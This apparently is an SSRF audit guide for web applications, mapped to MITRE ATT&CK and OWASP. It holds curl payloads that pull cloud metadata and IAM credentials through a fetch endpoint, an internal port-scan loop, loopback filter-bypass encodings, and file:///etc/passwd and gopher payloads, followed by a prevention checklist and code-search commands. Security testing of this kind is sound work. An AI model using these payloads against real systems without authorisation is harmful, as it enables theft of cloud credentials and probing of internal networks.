# SSRF Audit (Server-Side Request Forgery)

Based on MITRE ATT&CK T1190, T1078.004 and OWASP Top 10 A10:2021.

## When to Use

- After adding URL fetch/webhook/PDF generation features
- When processing user-provided URLs
- During security audits

## Attacks to Test

### 1. Cloud Metadata Access

```bash
# AWS EC2 Metadata
curl -X POST https://target/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# AWS IAM credentials
curl -X POST https://target/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# GCP Metadata
curl -X POST https://target/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/"}'

# Azure Metadata
curl -X POST https://target/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01"}'
```

### 2. Internal Network Scanning

```bash
for port in 22 80 443 3000 3306 5432 6379 8080 27017; do
  curl -s -X POST https://target/api/fetch-url \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://127.0.0.1:$port/\"}"
done
```

### 3. Filter Bypass

```bash
# IP encoding bypasses
http://0177.0.0.1/          # Octal
http://0x7f.0.0.1/          # Hex
http://2130706433/           # Decimal
http://127.1/                # Short form
http://[::1]/                # IPv6 loopback
http://127.0.0.1.nip.io/    # DNS wildcard

# Protocol bypass
file:///etc/passwd
gopher://127.0.0.1:6379/_SET%20ssrf%20test
```

## Checklist

### Prevention

- [ ] URL allowlisting (only trusted domains)
- [ ] Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16)
- [ ] Disable unused protocols (file://, gopher://, dict://)
- [ ] Use dedicated outbound proxy with DNS controls
- [ ] IMDSv2 enforced on AWS (session token required)

### High-Risk Features

- [ ] Webhook URL configuration
- [ ] URL preview/unfurling
- [ ] File import from URL
- [ ] PDF/screenshot generation from URL
- [ ] Image/avatar fetching from URL
- [ ] OAuth callback URLs

## Quick Scan

```bash
# Find URL fetch features
grep -rn "fetch\|axios\|request\|http\.get\|https\.get\|got(" apps/be/src/ --include="*.ts" | head -20

# Find webhook handling
grep -rn "webhook\|callback.*url\|redirect.*url" apps/be/src/ --include="*.ts"

# Check for URL validation
grep -rn "isValidUrl\|validateUrl\|url.*regex\|allowed.*domains" apps/be/src/ --include="*.ts"
```

## References

- Source: Anthropic-Cybersecurity-Skills `exploiting-server-side-request-forgery`
- OWASP: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
